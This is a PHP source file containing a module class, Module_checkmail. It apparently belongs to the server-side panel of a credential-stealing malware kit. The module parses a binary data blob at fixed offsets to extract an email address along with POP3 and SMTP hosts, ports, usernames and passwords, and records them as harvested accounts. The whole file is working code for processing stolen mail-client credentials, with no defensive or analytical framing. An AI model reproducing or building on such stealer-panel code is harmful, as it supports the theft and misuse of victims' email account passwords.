<?php

class Module_checkmail extends Module_
{
    protected function process($Data)
    {
        if (strlen($Data) < 1500)
            return;
		
        $Email = $Prot = $POPServer	= $POPPort = $POPUser = $POPPass = $SMTPServer = $SMTPPort = $SMTPUser = $SMTPPass 	= '';
		
		$stream = new Stream($Data);

		$stream->SetPos(1);
		$Email = $stream->getC_STR();
		$stream->SetPos(129);
		$POPServer = $stream->getC_STR(); //pop server
		$stream->SetPos(193);
		$POPUser = $stream->getC_STR(); //pop user
		$stream->SetPos(257);
		$POPPass = $stream->getC_STR(); //pop pass
		$stream->SetPos(322);
		$POPPort = ord($stream->getC_STR()); //pop port
		$stream->SetPos(326);
		$SMTPServer = $stream->getC_STR(); //smtp host
		$stream->SetPos(910);
		$SMTPPort = ord($stream->getC_STR()); //smtp port
		$stream->SetPos(1436);
		$SMTPUser = $stream->getC_STR(); //smtp user
		$stream->SetPos(1500);
		$SMTPPass = $stream->getC_STR(); //smtp pass
		
		$this->add_email($Email, 'pop3', $POPServer, $POPPort, $POPUser, $POPPass);
		$this->add_email($Email, 'smtp', $SMTPServer, $SMTPPort, $SMTPUser, $SMTPPass);
		
		$stream = NULL;
    }
	
    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
            $this->process($Data);
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}
